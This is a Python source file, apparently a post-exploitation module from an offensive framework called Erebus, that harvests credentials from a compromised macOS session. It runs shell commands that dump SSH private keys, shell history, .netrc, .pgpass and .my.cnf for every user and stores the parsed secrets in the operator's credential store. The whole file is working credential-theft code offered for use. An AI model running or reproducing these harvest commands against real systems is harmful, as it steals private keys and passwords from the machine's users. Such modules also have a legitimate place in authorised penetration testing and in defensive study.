"""Harvest credentials the controlled user can already read on a macOS session.

Read-only: reads SSH private keys, shell history (zsh is the macOS default),
and .netrc/.pgpass/.my.cnf the current session already has access to, and
records them in the credential store. It never cracks, escalates, prompts the
Keychain, or transmits secrets - values are stored locally and redacted over
the API. (Keychain items need the login password to decrypt, so they are out
of scope for a read-only harvest.)
"""
from __future__ import annotations

from erebus.core.module_base import OptionSpec, Post, Rank
from erebus.modules.post import _creds

_HARVEST = [
    ("ssh_keys",
     "for f in $(find /Users /var/root -maxdepth 4 -name 'id_*' ! -name '*.pub' "
     "-type f 2>/dev/null | head -20); do echo \"@@KEY@@ $f\"; cat \"$f\" 2>/dev/null; done",
     _creds.parse_ssh_keys),
    ("history",
     "cat ~/.zsh_history ~/.bash_history /Users/*/.zsh_history 2>/dev/null",
     _creds.parse_history),
    ("netrc", "cat ~/.netrc /Users/*/.netrc 2>/dev/null", _creds.parse_netrc),
    ("pgpass", "cat ~/.pgpass /Users/*/.pgpass 2>/dev/null", _creds.parse_pgpass),
    ("mycnf", "cat ~/.my.cnf /Users/*/.my.cnf 2>/dev/null", _creds.parse_mycnf),
]


class MacosCreds(Post):
    name = "macos_creds"
    description = ("Harvest readable credentials on an existing macOS session "
                   "(keys, history, netrc, config)")
    authors = ["Erebus"]
    references = ["https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation"]
    attack = ["T1552.001", "T1552.003", "T1555.001"]
    rank = Rank.NORMAL
    options = [
        OptionSpec("SESSION", required=True, kind="int",
                   desc="id of a live macOS session to harvest (see /sessions)"),
    ]

    def run(self) -> None:
        sess = self.get_session()
        if sess is None:
            return
        host = sess.host
        self.info_(f"harvesting readable credentials on session {sess.id} @ {host}")
        total = 0
        for label, cmd, parser in _HARVEST:
            try:
                out = sess.command(cmd, overall=12.0)
            except OSError as exc:
                self.warn(f"{label}: session read failed ({exc})")
                continue
            for cred in parser(out):
                total += 1
                self.add_credential(
                    host, cred.get("username", ""), secret=cred.get("secret", ""),
                    kind=cred.get("kind", "password"), service=cred.get("service", ""))
                self.add_finding(
                    host, f"Credential recovered: {cred.get('service', '')} "
                    f"({cred.get('username') or 'n/a'}, {cred.get('kind')})",
                    severity="medium", attack="T1552", evidence_ref=f"session:{sess.id}")
                self.good(f"{label}: {cred.get('service')} "
                          f"{cred.get('username') or '(no user)'} [{cred.get('kind')}]")
        if total == 0:
            self.info_("no readable credentials found with the current access")
        else:
            self.good(f"done: {total} credential(s) stored - see the Creds tab / /credentials")
